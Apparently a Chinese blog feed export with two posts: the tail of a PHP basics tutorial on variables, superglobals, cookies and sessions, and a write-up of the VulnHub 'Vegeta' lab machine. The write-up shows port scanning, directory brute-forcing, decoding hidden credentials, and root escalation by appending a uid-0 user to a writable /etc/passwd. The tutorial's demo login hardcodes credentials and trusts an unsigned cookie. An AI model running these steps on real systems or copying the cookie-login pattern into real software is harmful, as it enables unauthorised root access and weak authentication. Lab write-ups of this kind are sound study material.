class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116103508.png" /></p>
<p>上面的代码中使用了全局变量和局部变量，两者名称一样，在函数外时，使用全局变量（函数外没有函数内的变量），函数内部，优先使用局部变量。</p>
<p>如果需要在函数内使用全局变量该怎么做呢？可以使用
<code>$GLOBALS</code>，该语句的作用是：引用全局作用域中可用的全部变量。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$GLOBALS</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>查看一下这里面有什么：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116104117.png" /></p>
<p>除了自带的属性之外，最后一个属性就是该脚本中的全局变量，因此要在函数内部使用全局变量可以通过
<code>$GLOBAL[var_name]</code> 来使用。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span> = <span class="string">&#x27;takagi&#x27;</span>;  <span class="comment"># 全局变量</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_name</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$name</span> = <span class="string">&#x27;hello&#x27;</span>;  <span class="comment"># 局部变量</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$name</span>.<span class="string">&#x27;, &#x27;</span>.<span class="variable">$GLOBALS</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> get_name();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116104315.png" /></p>
<p>函数中的变量默认是动态设置的，当函数执行完毕，函数内部的变量就会被销毁，当如果函数内的变量使用
<code>static</code>
关键字声明，则函数结束后不会被销毁，下次调用时还能使用，实现了函数多次调用时的数据共享。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sum</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">static</span> <span class="variable">$total</span> = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$total</span> += <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> sum().<span class="string">&#x27;&lt;br&gt;&#x27;</span>.sum().<span class="string">&#x27;&lt;br&gt;&#x27;</span>.sum();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116104637.png" /></p>
<p>可以发现，每次调用 <code>sum()</code> 之后的 <code>$total</code>
值都会被保存，即使函数执行完毕也会留着。</p>
<h1 id="预定义变量">6. 预定义变量</h1>
<p><a href="https://www.php.net/manual/zh/reserved.variables.php">PHP:
预定义变量 - Manual</a></p>
<ol type="1">
<li><strong><code>$GLBALS</code>
：全局变量数组，引用全局作用域中可用的全部变量；</strong></li>
</ol>
<p>在 [[#5. 变量的作用域]] 中使用过。</p>
<ol start="2" type="1">
<li><strong><code>$_SERVER</code> ：服务器和执行环境信息；</strong></li>
<li><strong><code>$_GET</code> ：获取 URL
中传入的参数，是一个数组；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>Url 中可以传入参数，这被称为 get 请求，比如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://172.23.55.120/chapter2/var.php?name=takagi&amp;age=18</span><br></pre></td></tr></table></figure>
<p>上述 url 就传入了两个参数 <code>name</code> 和
<code>age</code>，查看结果：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116144452.png" /></p>
<ol start="4" type="1">
<li><strong><code>$_POST</code> ：当 HTTP POST 请求的 Content-Type 是
<code>application/x-www-form-urlencoded</code> 或
<code>multipart/form-data</code>
时，会将变量以关联数组形式传入当前脚本。简单来说就是表单中的参数会被当做
<code>$_POST</code> 数组的元素；</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$register</span> = &lt;&lt;&lt;<span class="string">&#x27;FORM&#x27;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;&quot;</span> method=<span class="string">&quot;post&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;name&quot;</span>&gt;姓名:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;name&quot;</span> id=<span class="string">&quot;name&quot;</span>&gt;</span><br><span class="line">    &lt;label <span class="keyword">for</span>=<span class="string">&quot;pwd&quot;</span>&gt;密码:&lt;/label&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;password&quot;</span> name=<span class="string">&quot;pwd&quot;</span> id=<span class="string">&quot;pwd&quot;</span>&gt;</span><br><span class="line">    &lt;input type=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;提交&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">FORM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$register</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>$register</code> 这是一个 post 表单</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116145304.png" /></p>
<p>打开界面的样子如上图，输入内容，并提交：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116145327.png" /></p>
<p>表单中的 <code>name</code> 成为键名，我们输入的内容作为值。</p>
<ol start="5" type="1">
<li><strong><code>$_COOKIE</code> ：通过 HTTP Cookies
方式传递给当前脚本的变量的数组；</strong></li>
</ol>
<p>Cookie 相关内容查看： [[2 简单的HTTP协议#2.7 cookie技术]]。</p>
<p>首先介绍一下如何生成 cookie，可以使用函数
<code>setcookie(name, value, expireTime, range, domainName)</code>，主要的是前两个参数：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">setcookie(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;takagi&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_COOKIE</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>第一次访问网页，生成 cookie，但并不会显示，刷新一下就会显示 cookie
了，这是因为 <code>$_COOKIE</code> 是从客户端提取
cookie，而第一次的时候是在本地生成
cookie，并写入客户端，此时客户端并没有
cookie，所以无法输出，刷新之后客户端已经有 cookie，所以可以显示。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116150215.png" /></p>
<p>写一个登录表单模拟一下真实的 cookie：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_GET[&#x27;action&#x27;]==&#x27;login&#x27;)&#123;</span><br><span class="line">    if($_POST[&#x27;name&#x27;]==&#x27;admin&#x27; &amp;&amp; $_POST[&#x27;pwd&#x27;]==123456)&#123;</span><br><span class="line">        setcookie(&#x27;userName&#x27;, $_POST[&#x27;name&#x27;], time()+3600*24);  # 创建cookie，时间为24小时</span><br><span class="line">        header(&#x27;Location:index.php&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &#x27;&lt;script&gt;alert(&quot;用户名或密码不对&quot;); &lt;/script&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">elseif($_GET[&#x27;action&#x27;]==&#x27;logout&#x27;)&#123;</span><br><span class="line">    setcookie(&#x27;userName&#x27;, &#x27;&#x27;, time()-3600);  # 注销cookie</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;?action=login&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &lt;fieldset&gt;</span><br><span class="line">            &lt;legend&gt;用户登录：&lt;/legend&gt;</span><br><span class="line">            &lt;label for=&quot;name&quot;&gt;用户名：&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;text&quot; name=&quot;name&quot; id=&quot;name&quot;&gt;</span><br><span class="line">            &lt;label for=&quot;password&quot;&gt;密码：&lt;/label&gt;</span><br><span class="line">            &lt;input type=&quot;password&quot; name=&quot;pwd&quot; id=&quot;pwd&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt;</span><br><span class="line">        &lt;/fieldset&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p><code>login.php</code>
：这是一个登录表单，如果用户名和密码正确，则跳转到
<code>index.php</code>，否则弹窗提示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(!isset($_COOKIE[&#x27;userName&#x27;]))&#123;</span><br><span class="line">    header(&#x27;Location:login.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    echo &#x27;welcome, &#x27;.$_COOKIE[&#x27;userName&#x27;].&#x27;!&lt;br&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><code>index.php</code> 欢迎界面。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116153805.png" /></p>
<p>用户名或密码错误的情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116153823.png" /></p>
<p>用户名、密码正确的情况：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116153847.png" /></p>
<ol start="6" type="1">
<li><strong><code>$_SESSION</code> ：当前脚本可用 SESSION
变量的数组。</strong></li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();  <span class="comment"># 打开一个会话，在客户端浏览器上创建一个session_id，保存在cookies中；</span></span><br><span class="line"><span class="keyword">echo</span> session_id();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116160324.png" /></p>
<p>因为 session 是保存在服务器上的，可以在服务器上查看
<code>/var/lib/php/sessions</code> ：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116160702.png" /></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();  <span class="comment"># 打开一个会话，在客户端浏览器上创建一个session_id，保存在cookies中；</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;userName&#x27;</span>] = <span class="string">&#x27;takagi&#x27;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;domain&#x27;</span>] = <span class="string">&#x27;hdfzzf.icu&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">print_r(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116160842.png" /></p>
<p>查看服务器 <code>session</code> 文件：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116160916.png" /></p>
<p>删除 <code>session</code> 中的内容：</p>
<ol type="1">
<li><p><code>unset($_SESSION['userName'])</code> ：删除特定元素；</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116161125.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116161140.png" /></p></li>
<li><p><code>session_destroy()</code> ：删除整个 session 文件；</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20221116161240.png" /></p>
<p>已不存在 session 文件。</p></li>
</ol>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php基础</tag>
      </tags>
  </entry>
  <entry>
    <title>30 Vulnhub Vegeta Writeup</title>
    <url>/2022/05/08/30%20Vulnhub%20Vegeta%20Writeup/</url>
    <content><![CDATA[<p>该靶机难度较简单。</p>
<span id="more"></span>
<h1 id="靶机信息">1. 靶机信息</h1>
<p>靶机地址：</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/vegeta-1,501/">Vegeta: 1 ~
VulnHub</a></li>
</ul>
<p>难度：</p>
<ul>
<li>低</li>
</ul>
<p>目标：</p>
<ul>
<li>获取root权限</li>
<li>拿到1个flag</li>
</ul>
<p>攻击方法：</p>
<ul>
<li>主机发现</li>
<li>端口扫描</li>
<li>信息收集</li>
<li>路径枚举</li>
<li>摩斯密码</li>
<li>数据编码还原</li>
<li>二维码解码</li>
<li>权限提升</li>
</ul>
<h1 id="渗透">2. 渗透</h1>
<h2 id="主机发现端口扫描端口服务发现">2.1.
主机发现、端口扫描、端口服务发现</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.34</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.34</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508173725.png" /></p>
<h2 id="http服务-get-shell">2.2. http服务 + get shell</h2>
<p>主页面是一张图片，然后什么都没有了。尝试访问robots.txt，得到一个提示：
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/find_me</span><br></pre></td></tr></table></figure></p>
<p>接着访问/find_me，找到一个find_me.html，页面很空，但是查看源码并滑到最后面，得到如下base64编码的字符串
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- aVZCT1J3MEtHZ29BQUFBTlNVaEVVZ0FBQU1nQUFBRElDQVlBQUFDdFdLNmVBQUFIaGtsRVFWUjRuTzJad1k0c09RZ0U1LzkvK3UyMU5TdTdCd3JTaVN0QzhoR2M0SXBMOTg4L0FGanljem9BZ0RNSUFyQUJRUUEySUFqQUJnUUIySUFnQUJzUUJHQURnZ0JzUUJDQURRZ0NzQUZCQURhRUJmbjUrUmwvbk9aTFAxeER6K3g5VTA1cWJoWjFkcjRzSFQyejkwMDVxYmxaMU5uNXNuVDB6TjQzNWFUbVpsRm41OHZTMFRONzM1U1RtcHRGblowdlMwZlA3SDFUVG1wdUZuVjJ2aXdkUGJQM1RUbXB1Vm5VMmZteWRQVE0zamZscE9hdVhKUVRUamxkSHZ0YmxvNDZOUWp5UjV4eUlvZ09CUGtqVGprUlJBZUMvQkdubkFpaUEwSCtpRk5PQk5HQklIL0VLU2VDNkVDUVArS1VFMEYwakJWRS9aSGM4SEhkUHZ1RWQwZVF3N003MWFtelRIaDNCRGs4dTFPZE9zdUVkMGVRdzdNNzFhbXpUSGgzQkRrOHUxT2RPc3VFZDBlUXc3TTcxYW16VEhoM0JEazh1MU9kT3N1RWQwZVFJcWJNNENUcmhKMGhTQkZUWmtDUUdBaFN4SlFaRUNRR2doUXhaUVlFaVlFZ1JVeVpBVUZpSUVnUlUyWkFrQmdJVXNTVUdSQWtCb0lVMFRHZjAxN2UrdTRJVXNScEtSRGtXYzVsdjNEQlN4ZjFqZE5TSU1pem5NdCs0WUtYTHVvYnA2VkFrR2M1bC8zQ0JTOWQxRGRPUzRFZ3ozSXUrNFVMWHJxb2I1eVdBa0dlNVZ6MkN4ZThkRkhmT0MwRmdqekx1ZXdYTGhCL2VGazZjcm84Mm9rc2IzMTNCQkgwdkNITFc5OGRRUVE5YjhqeTFuZEhFRUhQRzdLODlkMFJSTkR6aGl4dmZYY0VFZlM4SWN0YjN4MUJCRDF2eVBMV2R5OFZaTXJwV1BDYjY2YWNEQWdTbUkrNjJTY0RnZ1RtbzI3MnlZQWdnZm1vbTMweUlFaGdQdXBtbnd3SUVwaVB1dGtuQTRJRTVxTnU5c25nOVNPMkFjcmxQN212SXd2OEg3YjVDd1NCVDlqbUx4QUVQbUdidjBBUStJUnQvZ0pCNEJPMitRc0VnVS9ZNWk4UUJENlIvUS9pMURPTFU4OHBkV3FxY3lKSTBlenFubFBxMUNBSWdveXFVNE1nQ0RLcVRnMkNJTWlvT2pVSWdpQ2o2dFFnQ0lLTXFsTnpYQkExYnhZeWk5TU1UbStVeWwvZXNSZ0VpZU0wZzlNYnBmS1hkeXdHUWVJNHplRDBScW44NVIyTFFaQTRUak00dlZFcWYzbkhZaEFranRNTVRtK1V5bC9lc1JnRWllTTBnOU1icGZLWGR5d0dRZUk0emVEMFJxbjhwYzJTUTcxWkFxZlpwd2pTVWJmc2w2cEtoRU1RajV3SUVzeWZxa3FFUXhDUG5BZ1N6SitxU29SREVJK2NDQkxNbjZwS2hFTVFqNXdJRXN5ZnFrcUVReENQbkFnU3pKK3FTb1JERUkrY0NCTE1uNm9xRHVleWpLNmVhcHdFNmNpWjdabkttS29xRHVleWpLNmVhaEFFUVI3VnFYdXFRUkFFZVZTbjdxa0dRUkRrVVoyNnB4b0VRWkJIZGVxZWFoQUVRUjdWcVh1cVFaQ0JncWcvNWpmZjEvRngzUzdXOHE2cHdia1BRUkNFK3hDa01HZnFycW5CdVE5QkVJVDdFS1F3WitxdXFjRzVEMEVRaFBzUXBEQm42cTdLY0ZtY0hzYnBvM1RLMlpGbEFnaHlPQXVDZUlNZ2g3TWdpRGNJY2pnTGduaURJSWV6SUlnM0NISTRDNEo0Z3lDSHN5Q0lONldDM1A0d1RvL3RKTEo2TDhvc0NGSjBueG9FUVpDMkxCMzNxVUVRQkduTDBuR2ZHZ1JCa0xZc0hmZXBRUkFFYWN2U2NaOGFCRUdRdGl3ZDk2bEJrSUdDZE5TcGUyYnZVMzk0Nm5mb3lPazAzN0pmdU1Ba2VGZlA3SDFPSDE3MlBuVk9wL21XL2NJRkpzRzdlbWJ2Yy9yd3N2ZXBjenJOdCt3WExqQUozdFV6ZTUvVGg1ZTlUNTNUYWI1bHYzQ0JTZkN1bnRuN25ENjg3SDNxbkU3ekxmdUZDMHlDZC9YTTN1ZjA0V1h2VStkMG1tL1pMMXhnRXJ5clovWStwdzh2ZTU4NnA5Tjh5MzdoQXZHSGZzUHlPN0pNMmFkNlp3aGkrbWdkODkyd1R3UzU3RUU3WmtjUUJMbm1RVHRtUnhBRXVlWkJPMlpIRUFTNTVrRTdaa2NRQkxubVFUdG1SNUFYQ1hJNzZnKzJBN1dRSFZrNnhFcmxUMVZkRElKNFpFRVFVeERFSXd1Q21JSWdIbGtReEJRRThjaUNJS1lnaUVjV0JERUZRVHl5akJXa1kyRDFjV0xLQitUeXdYNERRUkFFUVlUM0ljaGhFS1FXQkVFUUJCSGVoeUNIUVpCYUVBUkJFRVI0SDRJY0JrRnFzUmJFaVk2Y04zek1UaCtzK28xUy9VNEg2QUpCRUFSQk5pQUlnaURJQmdSQkVBVFpnQ0FJZ2lBYkVBUkJFR1FEZ2lESUtFRnUrTGc2NW5QSzRuVFV1MTdlRlM0d2VqUjF6bzc1bkxJNEhmV3VsM2VGQzR3ZVRaMnpZejZuTEU1SHZldmxYZUVDbzBkVDUreVl6eW1MMDFIdmVubFh1TURvMGRRNU8rWnp5dUowMUx0ZTNoVXVNSG8wZGM2TytaeXlPQjMxcnBkM2hRdU1IazJkczJNK3B5eE9SNzNyNVYzaEFxTkhVK2QwMnN1VUxOTnpJb2h4M1ExWnB1ZEVFT082RzdKTXo0a2d4blUzWkptZUUwR002MjdJTWowbmdoalgzWkJsZWs0RU1hNjdJY3YwbkFoU3hKUVoxRDJuZkMvTEhKWExjQm9ZUVR4NlR2bGVsamtxbCtFME1JSjQ5Snp5dlN4elZDN0RhV0FFOGVnNTVYdFo1cWhjaHRQQUNPTFJjOHIzc3N4UnVReW5nUkhFbytlVTcyV1pvM0laVGdNamlFZlBLZC9MTWtmbE1weVk4bEVxSC9zSlRoODZnaFNBSUxVZ1NQT2kxQ0JJTFFqU3ZDZzFDRklMZ2pRdlNnMkMxSUlnell0U2d5QzFJRWp6b3RRZ1NDMElVckNvS1NjN245TmVzcHplZmNVTTJmbFMvU29EVERrZEMzYWF3U2tuZ2d3OEhRdDJtc0VwSjRJTVBCMExkcHJCS1NlQ0REd2RDM2Fhd1NrbmdndzhIUXQybXNFcEo0SU1QQjBMZHByQktlZnJCQUY0RXdnQ3NBRkJBRFlnQ01BR0JBSFlnQ0FBR3hBRVlBT0NBR3hBRUlBTkNBS3dBVUVBTmlBSXdBWUVBZGp3SHlVRnd2VnIwS3ZGQUFBQUFFbEZUa1N1UW1DQw== --&gt;</span><br></pre></td></tr></table></figure></p>
<p>放入<a
href="https://icyberchef.com/">CyberChef</a>，使用magic模块</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508193202.png" /></p>
<p>尝试使用这个密码去登录ssh，试了vegeta相关的各个用户名，都无法登录。</p>
<p>没有办法，接下来进行路径扫描，但是得到的文件和目录也都没有有用的信息，可能还有隐藏路径，因此换一个大字典
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.34/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt</span><br></pre></td></tr></table></figure></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508205453.png" /></p>
<p>扫出了一个目录/bulma，里面是一个音频文件，听内容应该是莫斯密码，使用下面的网址进行破解</p>
<ul>
<li><a
href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html?msclkid=0a38470ecebd11ec9d8b5a66adb8a09c">Morse
Code Adaptive Audio Decoder | Morse Code World</a></li>
</ul>
<p>破解的结果为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER : TRUNKS PASSWORD : US3R(S IN DOLLARS SYMBOL)</span><br></pre></td></tr></table></figure></p>
<p>根据这个意思真实的信息应该是：（摩斯密码不区分大小写）
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username: trunks</span><br><span class="line">password: u$3r</span><br></pre></td></tr></table></figure></p>
<p>直接利用ssh登录</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508193642.png" /></p>
<h2 id="权限提升">2.3. 权限提升</h2>
<p>查看/home/trunks/.bash_history，内容很少： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">perl -le ‘print crypt(“Password@973″,”addedsalt”)’</span><br><span class="line">perl -le &#x27;print crypt(&quot;Password@973&quot;,&quot;addedsalt&quot;)&#x27;</span><br><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd[/sh]</span><br><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br><span class="line">ls</span><br><span class="line">su Tom</span><br><span class="line">ls -la</span><br><span class="line">cat .bash_history </span><br><span class="line">sudo apt-get install vim</span><br><span class="line">apt-get install vim</span><br><span class="line">su root</span><br><span class="line">cat .bash_history </span><br><span class="line">exit</span><br></pre></td></tr></table></figure></p>
<p>根据内容，好像直接往/etc/passwd内添加了一个root用户，并且成功切换过去了。因此可能当前用户对/etc/passwd有写的权限，查看以下
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trunks@Vegeta:~$ ls -l /etc/passwd</span><br><span class="line">-rw-r--r-- 1 trunks root 1486 May  8 16:54 /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>trunks居然是该文件的属主，那接下来就很简单了。直接再次执行
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Tom:ad7t5uIalqMws:0:0:User_like_root:/root:/bin/bash&quot; &gt;&gt; /etc/passwd</span><br></pre></td></tr></table></figure></p>
<p>然后利用john破解
ad7t5uIalqMws，得到密码为Password。（当然也可以自己设置密码）</p>
<p>然后 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">trunks@Vegeta:~$ su Tom</span><br><span class="line">Password: </span><br><span class="line">root@Vegeta:/home/trunks<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
<p>成功拿到root权限。</p>
<p>最后读取/root/root.txt <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">                               ,   ,&#x27;|</span><br><span class="line">                             ,/|.-&#x27;   \.</span><br><span class="line">                          .-&#x27;  &#x27;       |.</span><br><span class="line">                    ,  .-&#x27;              |</span><br><span class="line">                   /|,&#x27;                 |&#x27;</span><br><span class="line">                  / &#x27;                    |  ,</span><br><span class="line">                 /                       ,&#x27;/</span><br><span class="line">              .  |          _              /</span><br><span class="line">               \`&#x27; .-.    ,&#x27; `.           |</span><br><span class="line">                \ /   \ /      \          /</span><br><span class="line">                 \|    V        |        |  ,</span><br><span class="line">                  (           ) /.--.   &#x27;&#x27;&quot;/</span><br><span class="line">                  &quot;b.`. ,&#x27; _.ee&#x27;&#x27; 6)|   ,-&#x27;</span><br><span class="line">                    \&quot;= --&quot;&quot;  )   &#x27; /.-&#x27;</span><br><span class="line">                     \ / `---&quot;   .&quot;|&#x27;</span><br><span class="line">  V E G I I T A       \&quot;..-    .&#x27;  |.</span><br><span class="line">                       `-__..-&#x27;,&#x27;   |</span><br><span class="line">                     _.) &#x27; .-&#x27;/    /\.</span><br><span class="line">               .--&#x27;/----..--------. _.-&quot;&quot;-.</span><br><span class="line">            .-&#x27;)   \.   /     _..-&#x27;     _.-&#x27;--.</span><br><span class="line">           / -&#x27;/      &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;         ,&#x27;-.   . `.</span><br><span class="line">          | &#x27; /                        /    `   `. \</span><br><span class="line">          |   |                        |         | |</span><br><span class="line">           \ .&#x27;\                       |     \     |</span><br><span class="line">          / &#x27;  | ,&#x27;               . -  \`.    |  / /</span><br><span class="line">         / /   | |                      `/&quot;--. -&#x27; /\</span><br><span class="line">        | |     \ \                     /     \     |</span><br><span class="line">         | \      | \                  .-|      |    |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Hurray you got root</span><br><span class="line"></span><br><span class="line">Share your screenshot in telegram : https://t.me/joinchat/MnPu-h3Jg4CrUSCXJpegNw</span><br></pre></td></tr></table></figure></p>
<h1 id="番外">3. 番外</h1>
<h2 id="二维码解码">3.1. 二维码解码</h2>
<p>注释中的字符串经过两次base64解码之后会得到PNG的文件头，将内容导出为png图片，会发现是一个二维码，接下来可以使用cyberchef的parse
QR code进行处理，也可以使用zbarimg工具进行处理。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508210711.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(m1ku㉿kali)-[~/Downloads]</span><br><span class="line">└─$ zbarimg -q a.png</span><br><span class="line">QR-Code:Password : topshellv</span><br></pre></td></tr></table></figure>
<p>得到的是同样的结果。 ## 3.2. 摩斯密码音频解密
除了使用在线工具之外，还可以使用音频软件获取音频信息。推荐audacity。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220508211009.png" /></p>
<p>短的代表. ；长的代表- ； 中间间隔比较长说明换一个字符了。</p>
